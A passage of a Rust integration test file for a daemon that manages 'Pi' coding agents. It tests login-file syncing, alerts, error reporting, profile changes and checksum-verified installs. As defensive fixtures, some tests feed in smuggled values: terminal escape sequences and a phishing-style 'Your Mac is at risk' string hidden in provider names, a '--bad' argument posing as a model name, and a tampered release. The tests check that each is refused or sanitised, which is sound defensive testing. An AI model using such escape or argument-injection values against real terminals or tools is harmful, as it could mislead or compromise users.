    w.core.pi_watch(&mut seen).await;
    fs::write(signin.join("auth.json"), auth("OLD")).unwrap();
    w.core.pi_watch(&mut seen).await;
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    let copy = w
        .layout
        .agent_dir(&r)
        .join(vibe_env::pi::VM_AGENT_DIR)
        .join("auth.json");
    assert!(fs::read_to_string(&copy).unwrap().contains("OLD"));
    w.core.sleep_agent(None, &r).await.unwrap();
    fs::write(signin.join("auth.json"), auth("NEW")).unwrap();
    w.core.pi_watch(&mut seen).await;
    assert!(
        fs::read_to_string(&copy).unwrap().contains("OLD"),
        "one asleep isn't looked at"
    );
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "and again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    assert!(fs::read_to_string(&copy).unwrap().contains("NEW"));
    w.delete(&r).await;
}

/// B4: an alert about an agent's copy stays while it sleeps, and goes with it.
#[tokio::test]
async fn an_agents_alert_outlasts_its_sleep() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(copy.join("auth.json"), "not json").unwrap();
    w.core.pi_watch(&mut seen).await;
    let alerts = |w_core: Arc<Core>| async move {
        w_core
            .pi_status(HostParams { host: None })
            .await
            .unwrap()
            .vms
            .unwrap()
            .alerts
    };
    assert_eq!(alerts(Arc::clone(&w.core)).await.len(), 1);
    w.core.sleep_agent(None, &r).await.unwrap();
    w.core.pi_watch(&mut seen).await;
    assert_eq!(
        alerts(Arc::clone(&w.core)).await.len(),
        1,
        "asleep, it stands"
    );
    w.delete(&r).await;
    w.core.pi_watch(&mut seen).await;
    assert!(
        alerts(Arc::clone(&w.core)).await.is_empty(),
        "the agent's gone"
    );
}

/// What the backend finds at a launch or a wake isn't swallowed, or left for the
/// next tick.
#[tokio::test]
async fn a_copy_gone_bad_is_told_of_as_the_agent_resumes() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    end_its_session(&w, &r).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(copy.join("auth.json"), "not json").unwrap();
    w.core.resume_agent(None, &r).await.unwrap();
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    let alerts = status.vms.unwrap().alerts;
    assert_eq!(alerts.len(), 1, "with no tick since: {alerts:?}");
    assert!(alerts[0].contains(&r), "{alerts:?}");
    w.delete(&r).await;
}

/// Several things going wrong at once are each said.
#[tokio::test]
async fn every_alert_of_a_tick_is_said() {
    let w = world().await;
    w.sign_in();
    let (a, b) = (w.start("one").await.agent, w.start("two").await.agent);
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    for r in [&a, &b] {
        fs::write(
            w.layout
                .agent_dir(r)
                .join(vibe_env::pi::VM_AGENT_DIR)
                .join("auth.json"),
            "not json",
        )
        .unwrap();
    }
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    let first = events.try_recv().unwrap().message.unwrap();
    let second = events.try_recv().unwrap().message.unwrap();
    let said = format!("{first}\n{second}");
    assert!(said.contains(&a) && said.contains(&b), "{said}");
    w.delete(&a).await;
    w.delete(&b).await;
}

/// Nit: Pi takes `/model` itself and writes nothing. That's no failed turn, even
/// under an answer that reads just like one.
#[tokio::test]
async fn a_send_pi_takes_itself_is_no_failed_turn() {
    let w = world().await;
    w.sign_in();
    let r = w.start("sayerror").await.agent;
    w.wait_for(&r, Activity::Done).await;
    for text in ["/model", "!ls"] {
        w.core
            .send_input(
                None,
                &r,
                vibe_mcp::Input::Text {
                    text: text.into(),
                    submit: true,
                    force: false,
                },
            )
            .await
            .unwrap();
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        let (_, activity, _) = w.state(&r).await;
        assert_eq!(activity, Activity::Done, "{text}");
    }
    w.delete(&r).await;
}

/// Nit: what starts with a `/` needn't be Pi's. A path goes to the model, and if the
/// turn fails before it starts, the screen says why, as for any other.
#[tokio::test]
async fn a_prompt_starting_with_a_slash_that_fails_shows_its_error() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "/tmp/notes.txt nologin".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    w.wait_screen(&r, "No API key found for mock").await;
    w.wait_for(&r, Activity::Errored).await;
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let error = list.agents.iter().find(|a| a.agent == r).unwrap();
    assert!(
        error
            .status
            .error
            .as_deref()
            .is_some_and(|e| e.contains("No API key found for mock")),
        "{:?}",
        error.status
    );
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(check.answered, "it's answered all it will");
    // And one that works is answered as any other is.
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "/tmp/notes.txt is empty".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    w.wait_screen(&r, "Working on: /tmp/notes.txt is empty")
        .await;
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

/// N1: the send before it was answered long ago, and a `/model` after it owes none.
#[tokio::test]
async fn a_send_pi_takes_itself_after_a_tracked_one_is_no_failed_turn() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    w.wait_for(&r, Activity::Done).await;
    let send = |text: &'static str| {
        let (core, r) = (Arc::clone(&w.core), r.clone());
        async move {
            core.send_input(
                None,
                &r,
                vibe_mcp::Input::Text {
                    text: text.into(),
                    submit: true,
                    force: false,
                },
            )
            .await
            .unwrap();
        }
    };
    send("sayerror").await;
    w.wait_screen(&r, "No API key found for stripe").await;
    w.wait_for(&r, Activity::Done).await;
    send("/model").await;
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    let (_, activity, _) = w.state(&r).await;
    assert_eq!(activity, Activity::Done);
    w.delete(&r).await;
}

/// S5, through the daemon: what an agent offered is listed, and forgotten on the
/// owner's word, from every copy.
#[tokio::test]
async fn the_owner_forgets_what_an_agent_offered_and_it_goes_from_every_copy() {
    let w = world().await;
    w.sign_in();
    let (hostile, other) = (w.start("one").await.agent, w.start("two").await.agent);
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = |r: &str| w.layout.agent_dir(r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(
        copy(&hostile).join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"fake"},
            "junk-a":{"type":"api_key","key":"a"},
            "junk-b":{"type":"api_key","key":"b"}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    w.core.pi_watch(&mut seen).await;
    assert_eq!(
        vibe_env::pi::logins_in(&copy(&other)),
        ["junk-a", "junk-b", "mock"]
    );
    let vms = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap();
    assert_eq!(vms.offered.len(), 2);
    assert_eq!(vms.offered[0].provider, "junk-a");
    assert_eq!(vms.offered[0].agent, hostile);
    let (_, mut events) = w.core.subscribe();
    let after = w
        .core
        .pi_forget(vibe_core::rpc::PiForgetParams {
            host: None,
            providers: vec!["junk-a".into(), "junk-b".into()],
        })
        .await
        .unwrap();
    let vms = after.vms.unwrap();
    assert_eq!(vms.logins, ["mock"]);
    assert!(vms.offered.is_empty());
    assert!(vms.alerts.is_empty(), "{:?}", vms.alerts);
    assert_eq!(
        events.try_recv().unwrap().kind,
        vibe_core::model::EventKind::PiChanged
    );
    w.core.pi_watch(&mut seen).await;
    assert_eq!(vibe_env::pi::logins_in(&copy(&other)), ["mock"]);
    assert_eq!(vibe_env::pi::logins_in(&copy(&hostile)), ["mock"]);
    let e = w
        .core
        .pi_forget(vibe_core::rpc::PiForgetParams {
            host: None,
            providers: vec!["\u{1b}[2J".into()],
        })
        .await
        .unwrap_err();
    assert_eq!(e.code, ErrorCode::InvalidParams.code());
    w.delete(&hostile).await;
    w.delete(&other).await;
}

/// R3, through the daemon: however it got there, an alert is only text.
#[tokio::test]
async fn an_alert_a_guest_wrote_reaches_no_terminal() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    let phish = format!("\\u001b[2JYour Mac is at risk {}", "x".repeat(100_000));
    fs::write(
        copy.join("auth.json"),
        format!(r#"{{"{phish}":{{"type":"api_key","key":"k"}}}}"#),
    )
    .unwrap();
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    let vms = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap();
    assert_eq!(vms.alerts.len(), 1, "{:?}", vms.alerts);
    let event = events.try_recv().unwrap().message.unwrap();
    for said in [&vms.alerts[0], &event] {
        assert!(!said.contains("at risk"), "{said}");
        assert!(!said.contains('\u{1b}'), "{said}");
        assert!(said.len() < 1000, "{}", said.len());
        assert!(said.contains(&r), "{said}");
    }
    w.delete(&r).await;
}

/// N2: one copy looking fine after another found the store bad doesn't hide it.
#[tokio::test]
async fn a_bad_store_stays_told_of_whichever_copy_looks_last() {
    let w = world().await;
    w.sign_in();
    let (a, b) = (w.start("one").await.agent, w.start("two").await.agent);
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let store = w.layout.linux_pi_logins_dir().join("auth.json");
    let good = fs::read_to_string(&store).unwrap();
    fs::write(&store, "not json").unwrap();
    // One of them quarantined all the same, so a look at it isn't about the store.
    let copy = w.layout.agent_dir(&b).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(copy.join("auth.json"), "not json").unwrap();
    w.core.pi_watch(&mut seen).await;
    let alerts = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap()
        .alerts;
    assert!(
        alerts.iter().any(|a| a.contains("can't be kept in step")),
        "{alerts:?}"
    );
    fs::write(&store, good).unwrap();
    fs::write(copy.join("auth.json"), "{}").unwrap();
    w.core.pi_watch(&mut seen).await;
    let alerts = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap()
        .alerts;
    assert!(alerts.is_empty(), "{alerts:?}");
    w.delete(&a).await;
    w.delete(&b).await;
}

/// N5: what the broker keeps going bad reaches Settings, not silence.
#[tokio::test]
async fn what_the_broker_keeps_going_bad_is_told_of() {
    let w = world().await;
    w.sign_in();
    let dir = w.layout.linux_pi_logins_dir();
    fs::write(dir.join(vibe_env::pi_logins::NOTICES_FILE), "not json").unwrap();
    let alerts = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap()
        .alerts;
    assert_eq!(alerts.len(), 1, "{alerts:?}");
    assert!(alerts[0].contains("notices.json"), "{alerts:?}");
}

/// Delete takes its sessions and its copy, and nothing of the store.
#[tokio::test]
async fn a_delete_keeps_the_login_every_agent_shares() {
    let w = world().await;
    w.sign_in();
    let (one, two) = (w.start("one").await, w.start("two").await);
    let (a, b) = (one.agent.clone(), two.agent.clone());
    w.wait_for(&a, Activity::Done).await;
    w.wait_for(&b, Activity::Done).await;
    w.delete(&a).await;
    assert!(!w.layout.agent_dir(&a).exists());
    assert!(w.layout.linux_pi_logins_dir().join("auth.json").is_file());
    let (_, activity, _) = w.state(&b).await;
    assert_eq!(activity, Activity::Done, "the other's unharmed");
    w.delete(&b).await;
}

/// F3: the login goes under a running agent, and a send fails before Pi writes
/// anything. It read as done, and `vibe_wait` waited on for ever.
#[tokio::test]
async fn a_later_turn_that_fails_before_it_starts_is_shown_and_answers_the_wait() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "nologin".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(!check.answered, "too soon to say");
    w.wait_for(&r, Activity::Errored).await;
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == r).unwrap();
    assert!(
        agent
            .status
            .error
            .as_deref()
            .unwrap()
            .contains("No API key"),
        "{:?}",
        agent.status.error
    );
    assert_eq!(agent.state, AgentState::Idle);
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(check.answered, "the wait is over");
    assert_eq!(check.activity, Activity::Errored);
    // And once it's told to try again and can, that's what it reads as.
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    w.wait_screen(&r, "Working on: again").await;
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

/// N2: signed in again and told to go on, with the old error still on screen, a
/// turn that takes a while has written nothing past its prompt yet. It's working.
#[tokio::test]
async fn a_running_turn_isnt_failed_by_the_error_above_it() {
    let w = world().await;
    w.sign_in();
    let a = w.start("nologin").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Errored).await;
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "think 8".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    wait_until("its prompt on disk", || names(&w.sessions(&r)).len() == 1);
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    let (state, activity, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Busy, "{activity}");
    assert_ne!(activity, Activity::Errored);
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

/// Editing a profile never turns Pi's lack of approvals into a choice nobody
/// made, nor leaves Claude in bypass.
#[tokio::test]
async fn a_profile_moves_between_agents_and_environments_on_the_owners_word() {
    let w = world().await;
    let set = |p: ProfileUpdateParams| {
        w.core.update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            ..p
        })
    };
    // To the Mac it takes saying so.
    let e = set(ProfileUpdateParams {
        environment: Some(Environment::Macos),
        ..Default::default()
    })
    .unwrap_err();
    assert!(e.message.contains("never asks"), "{}", e.message);
    let moved = set(ProfileUpdateParams {
        environment: Some(Environment::Macos),
        mode: Some(Mode::Bypass),
        ..Default::default()
    })
    .unwrap();
    assert_eq!(moved.mode, Mode::Bypass);
    // Back, and on to Claude, which goes back to auto and forgets the model.
    let back = set(ProfileUpdateParams {
        environment: Some(Environment::Linux),
        ..Default::default()
    })
    .unwrap();
    assert_eq!(back.pi_model.as_deref(), Some("mock/mock-model"));
    let claude = set(ProfileUpdateParams {
        agent: Some(AgentKind::Claude),
        ..Default::default()
    })
    .unwrap();
    assert_eq!((claude.mode, claude.pi_model), (Mode::Auto, None));
    // A bad model is refused, before anything's saved.
    let e = set(ProfileUpdateParams {
        agent: Some(AgentKind::Pi),
        pi_model: Some("--bad".into()),
        ..Default::default()
    })
    .unwrap_err();
    assert!(e.message.contains("isn't a Pi model"), "{}", e.message);
    let profiles = w
        .core
        .profiles(ProjectParams {
            host: None,
            project: "app".into(),
        })
        .unwrap()
        .profiles;
    let saved = profiles.iter().find(|p| p.name == "pi-linux").unwrap();
    assert_eq!(saved.agent, AgentKind::Claude);
}

/// The Model field takes anything that's safe to pass on, and Pi gets it as it is.
#[tokio::test]
async fn a_bare_model_id_saves_and_goes_to_pi_as_it_is() {
    let w = world().await;
    w.sign_in();
    let saved = w
        .core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("deepseek-v4.1-flash".into()),
            ..Default::default()
        })
        .unwrap();
    assert_eq!(saved.pi_model.as_deref(), Some("deepseek-v4.1-flash"));
    let a = w.start("hello").await;
    let r = a.agent.clone();
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    let at = args.iter().position(|a| *a == "--model").unwrap();
    assert_eq!(args[at + 1], "deepseek-v4.1-flash", "{args:?}");
    w.wait_screen(&r, "Working on: hello").await;
    w.delete(&r).await;
}

/// A model Pi won't take is Pi's to refuse, and the app says what it said, in place
/// of an agent that just reads as exited.
#[tokio::test]
async fn a_model_pi_wont_take_is_said_in_pis_words() {
    let w = world().await;
    w.sign_in();
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("no-such-model".into()),
            ..Default::default()
        })
        .unwrap();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    let socket = w.layout.session_socket(&r);
    wait_until("it to exit", || {
        !socket.exists()
            && w.layout
                .agent_dir(&r)
                .join(vibe_core::shim::RECORD_FILE)
                .is_file()
    });
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == r).unwrap();
    assert_eq!(agent.state, AgentState::Exited);
    assert_eq!(agent.status.activity, Activity::Errored);
    let said = agent.status.error.clone().unwrap_or_default();
    assert!(said.contains("Model \"no-such-model\" not found"), "{said}");
    assert!(!said.contains("--list-models"), "{said}");
    assert!(said.contains("start a new agent"), "{said}");

    // A wait on it ends, and clicking it says the same as its row.
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert_eq!(check.state, AgentState::Exited);
    assert_eq!(check.activity, Activity::Errored);
    assert!(check.answered, "{check:?}");
    let e = w
        .core
        .attach_session(vibe_core::rpc::SessionParams {
            host: None,
            agent: r.clone(),
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("exited with code 1"), "{}", e.message);
    assert!(
        e.message.contains("Model \"no-such-model\" not found"),
        "{}",
        e.message
    );

    // It keeps the model it started with, so a resume says the same again, with
    // the profile put right or not.
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("mock/mock-model".into()),
            ..Default::default()
        })
        .unwrap();
    w.core.resume_agent(None, &r).await.unwrap();
    wait_until("it to exit again", || {
        !socket.exists()
            && w.layout
                .agent_dir(&r)
                .join(vibe_core::shim::RECORD_FILE)
                .is_file()
    });
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == r).unwrap();
    assert_eq!(agent.status.activity, Activity::Errored);

    // A send wakes it, it gives up again, and the send says what Pi said.
    let record = w.layout.agent_dir(&r).join(vibe_core::shim::RECORD_FILE);
    let before = fs::metadata(&record).unwrap().modified().unwrap();
    let e = w
        .core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "are you there?".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap_err();
    assert!(e.message.contains("nothing was sent"), "{}", e.message);
    assert!(
        e.message.contains("Model \"no-such-model\" not found"),
        "{}",
        e.message
    );
    assert!(!e.message.contains("os error"), "{}", e.message);
    assert!(!e.message.contains("--list-models"), "{}", e.message);
    assert_ne!(fs::metadata(&record).unwrap().modified().unwrap(), before);

    // A new agent has the profile as it is now, and nothing of that stays.
    let b = w.start("hello again").await;
    w.wait_for(&b.agent, Activity::Done).await;
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == b.agent).unwrap();
    assert_eq!(agent.status.error, None);
    w.delete(&r).await;
    w.delete(&b.agent).await;
}

/// An exited Pi's record is read once, not on every refresh, and read again when it
/// changes.
#[tokio::test]
async fn what_an_exited_pi_left_is_read_again_only_when_it_changes() {
    let w = world().await;
    w.sign_in();
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("no-such-model".into()),
            ..Default::default()
        })
        .unwrap();
    let r = w.start("hello").await.agent;
    let file = w.layout.agent_dir(&r).join(vibe_core::shim::RECORD_FILE);
    let socket = w.layout.session_socket(&r);
    wait_until("it to exit", || !socket.exists() && file.is_file());
    let error = async || {
        let list = w.core.agents(HostParams { host: None }).await.unwrap();
        let agent = list.agents.iter().find(|x| x.agent == r).unwrap();
        agent.status.error.clone()
    };
    assert!(error().await.unwrap().contains("no-such-model"));

    // Other bytes in a file that looks the same: this is only said if it isn't read.
    let looks = fs::metadata(&file).unwrap();
    fs::write(&file, " ".repeat(usize::try_from(looks.len()).unwrap())).unwrap();
    let set_time = |at| {
        fs::File::options()
            .write(true)
            .open(&file)
            .unwrap()
            .set_modified(at)
            .unwrap();
    };
    set_time(looks.modified().unwrap());
    assert!(error().await.unwrap().contains("no-such-model"));

    // Looking different, it's read: what can't be parsed says nothing.
    set_time(looks.modified().unwrap() + std::time::Duration::from_secs(5));
    assert_eq!(error().await, None);

    // And a quit is no complaint, whatever was said before.
    common::write_record(&w.layout, &r, Some(0), None, "2026-11-05T10:00:00Z");
    assert_eq!(error().await, None);
    w.delete(&r).await;
}

/// `pi auth check` says `invalid` of every bare id. That isn't a refusal, so with a
/// login Pi gets to try, and with none at all it's said that there's none.
#[tokio::test]
async fn a_bare_model_id_with_no_login_says_so_at_the_start() {
    let w = world().await;
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("deepseek-v4.1-flash".into()),
            ..Default::default()
        })
        .unwrap();
    let e = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("any provider"), "{}", e.message);
}

#[tokio::test]
async fn pi_status_names_providers_and_never_what_they_hold() {
    let w = world().await;
    w.sign_in();
    let own = w.golden.home.join(".pi/agent");
    fs::create_dir_all(&own).unwrap();
    fs::write(
        own.join("auth.json"),
        r#"{"openai":{"type":"oauth","access":"sk-secret","refresh":"rt-secret","expires":1}}"#,
    )
    .unwrap();
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    assert_eq!(status.logins, ["openai"]);
    let vms = status.vms.as_ref().unwrap();
    assert_eq!(vms.logins, ["mock"]);
    assert_eq!(vms.version, None);
    let wire = serde_json::to_string(&status).unwrap();
    assert!(!wire.contains("secret"), "{wire}");
    let _: Value = serde_json::from_str(&wire).unwrap();
}

#[tokio::test]
async fn installing_for_vms_builds_a_checked_layer() {
    let tmp = tempfile::tempdir().unwrap();
    let releases = tmp.path().join("releases");
    let url = format!("file://{}", releases.display());
    let w = world_with(|c| c.pi_releases = url).await;
    let refused = w
        .core
        .pi_install(PiInstallParams {
            host: None,
            target: PiTarget::Vm,
        })
        .await
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::CommandFailed.code());
    // A tampered release is refused, and no layer comes of it.
    let pinned = vibe_env::pi_release::PINNED;
    publish_pi(&releases, pinned, vibe_env::pi_release::VM_PLATFORM);
    let tarball = releases.join(format!("download/v{pinned}/pi-linux-arm64.tar.gz"));
    let good = fs::read(&tarball).unwrap();
    fs::write(&tarball, b"tampered").unwrap();
    let e = w
        .core
        .pi_install(PiInstallParams {
            host: None,
            target: PiTarget::Vm,
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("SHA-256"), "{}", e.message);
    let layer = w.layout.linux_dir().join(format!("pi-{pinned}.img"));
    assert!(!layer.exists());
    fs::write(&tarball, good).unwrap();
    // The version this build pins, whatever's newest there.
    publish_pi(&releases, "99.0.0", vibe_env::pi_release::VM_PLATFORM);
    let status = w
        .core
        .pi_install(PiInstallParams {
            host: None,
            target: PiTarget::Vm,
        })
        .await
        .unwrap();
    assert_eq!(status.vms.unwrap().version.as_deref(), Some(pinned));
    assert!(layer.is_file());
    assert!(!w.layout.linux_dir().join("pi-99.0.0.img").exists());
}

/// #74: nobody installs Pi. A host with no `pi` where its agents look for one, as a
/// native backend's: `~/.local/bin/pi`, where VibeOS's own install links it.
struct NoPi {
    golden: Golden,
    core: Arc<Core>,
    releases: PathBuf,
    _tmp: tempfile::TempDir,
}

impl NoPi {
    /// With `backend`, given the world's home, in place of one looking for Pi on
    /// this machine.
    async fn with(
        backend: impl FnOnce(&Path, vibe_env::testing::TestBackend) -> vibe_env::testing::TestBackend,
    ) -> NoPi {
        set_stray_keys();
        let tmp = tempfile::tempdir().unwrap();
        let releases = tmp.path().join("releases");
        fs::create_dir_all(&releases).unwrap();
        let golden = Golden::new();
        let mut config = golden.config();
        config.pi_releases = format!("file://{}", releases.display());
        // The real doctor, on what's really there, on a PATH of the home's own.
        config.checks = Arc::new(vibed::doctor::Machine::new(&golden.home).with_path(format!(
            "{}:/usr/bin:/bin",
            golden.home.join(".local/bin").display()
        )));
        let base = vibe_env::testing::TestBackend::new(&golden.claude).with_pi(
            golden.claude.with_file_name("pi"),
            golden.home.join("pi-agent"),
        );
        config.backends = Backends::all(Arc::new(backend(&golden.home, base)));
        let core = Arc::new(Core::open(config).unwrap());
        core.add_project(ProjectAddParams {
            path: Some(golden.home.join("src/app").to_str().unwrap().into()),
            ..Default::default()
        })
        .await
        .unwrap();
        NoPi {
            golden,
            core,
            releases,
            _tmp: tmp,
        }
    }

    async fn native() -> NoPi {
        NoPi::with(|home, backend| backend.with_native_pi_in(home.join(".local/bin/pi"))).await
    }

    fn link(&self) -> PathBuf {
        self.golden.home.join(".local/bin/pi")
    }

    fn installed(&self, version: &str) -> PathBuf {
        Layout::new(&self.golden.home, "macos")
            .data_dir()
            .join(format!("pi-{version}/pi"))
    }

    fn publish(&self) {
        publish_pi(
            &self.releases,
            vibe_env::pi_release::PINNED,
            vibe_env::pi_release::platform_here().unwrap(),
        );
    }

    fn save_profile(&self) {
        self.core
            .create_profile(ProfileCreateParams {
                project: "app".into(),
                name: "pi-native".into(),
                agent: Some(AgentKind::Pi),
                pi_model: Some("mock/mock-model".into()),
                ..Default::default()
            })
            .unwrap();
    }

    async fn start(&self) -> Result<vibe_core::rpc::Agent, vibe_core::rpc::ErrorObject> {
        self.core
            .start_agent(AgentStartParams {
                project: "app".into(),
                profile: "pi-native".into(),
                prompt: "hello".into(),
                ..Default::default()
            })
            .await
    }

    async fn doctors_row(&self) -> vibe_core::rpc::DoctorCheck {
        let report = self.core.doctor().await;
        report
            .checks
            .into_iter()
            .find(|c| c.id == CheckId::Pi)
            .unwrap()
    }
}

#[tokio::test]
async fn a_host_with_no_pi_profile_never_downloads_it_and_asks_nothing() {
    let w = NoPi::native().await;
    w.publish();
    w.core.repair_setup().await;
    assert!(!w.link().exists());
    let row = w.doctors_row().await;
    assert_eq!(row.state, CheckState::Optional, "{row:?}");
    assert_eq!(row.hint, None);
}

#[tokio::test]
async fn saving_a_pi_profile_installs_pi_with_nobody_asked() {
    let w = NoPi::native().await;
    w.publish();
    // Background work only runs where the core knows itself, as in vibed.
    w.core.spawn_links();
    w.save_profile();
    let link = w.link();
    for _ in 0..1000 {
        if link.exists() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    assert_eq!(
        fs::read_link(&link).unwrap(),
        w.installed(vibe_env::pi_release::PINNED)
    );
}

#[tokio::test]
async fn a_pi_profile_from_before_gets_pi_at_the_next_look() {
    let w = NoPi::native().await;
    // Nothing is published, as with the network down when it was saved.
    w.save_profile();
    w.core.repair_setup().await;
    assert!(!w.link().exists());
    let row = w.doctors_row().await;
    assert_eq!(
        (row.state, row.fixable),
        (CheckState::Fail, true),
        "{row:?}"
    );
    assert!(row.hint.unwrap().contains("tries again"));
    // The network's back: the next look does it, and the doctor has nothing to say.
    w.publish();
    w.core.repair_setup().await;
    assert!(w.link().exists());
    assert_eq!(w.doctors_row().await.state, CheckState::Pass);
}

#[tokio::test]
async fn the_doctors_try_again_installs_pi_or_says_why_not() {
    let w = NoPi::native().await;
    w.save_profile();
    w.core.repair_setup().await;
    let e = w
        .core
        .doctor_fix(DoctorFixParams { check: CheckId::Pi })
        .await
        .unwrap_err();
    assert_eq!(e.code, ErrorCode::CommandFailed.code());
    w.publish();
    w.core
        .doctor_fix(DoctorFixParams { check: CheckId::Pi })
        .await
        .unwrap();
    assert!(w.link().exists());
}

#[tokio::test]
async fn the_first_pi_agent_just_starts_with_pi_installed_on_the_way() {
    let w = NoPi::native().await;
    w.publish();
    // No background work here, so it's the start that does it.
    w.save_profile();
    assert!(!w.link().exists());
    w.start().await.unwrap();
    assert!(w.link().exists());
}

#[tokio::test]
async fn a_pi_that_cant_be_installed_fails_the_start_saying_so_and_leaves_nothing() {
    let w = NoPi::native().await;
    w.save_profile();
    let e = w.start().await.unwrap_err();
    assert_eq!(e.code, ErrorCode::CommandFailed.code());
    assert!(e.message.contains("couldn't install"), "{}", e.message);
    assert!(e.message.contains("tries again"), "{}", e.message);
    assert!(!e.message.contains("vibe pi"), "{}", e.message);
    let agents = w
        .core
        .agents(HostParams { host: None })
        .await
        .unwrap()
        .agents;
    assert!(agents.is_empty(), "{agents:?}");
    let worktrees = w.golden.home.join("VibeOS/worktrees/app");
    assert!(
        fs::read_dir(&worktrees).map_or(true, |mut d| d.next().is_none()),
        "the start was undone"
    );
    // It works once it can.
    w.publish();
    w.start().await.unwrap();
}

#[tokio::test]
async fn vibeos_own_older_pi_moves_to_the_pin_and_the_owners_is_left_alone() {
    use std::os::unix::fs::PermissionsExt;
    let w = NoPi::native().await;
    w.publish();
    w.save_profile();
    // VibeOS's own, from a build that pinned another.
    let old = w.installed("0.9.0");
    fs::create_dir_all(old.parent().unwrap()).unwrap();
    fs::write(&old, "#!/bin/sh\n").unwrap();
    fs::set_permissions(&old, fs::Permissions::from_mode(0o755)).unwrap();
    fs::create_dir_all(w.link().parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(&old, w.link()).unwrap();
    w.core.repair_setup().await;
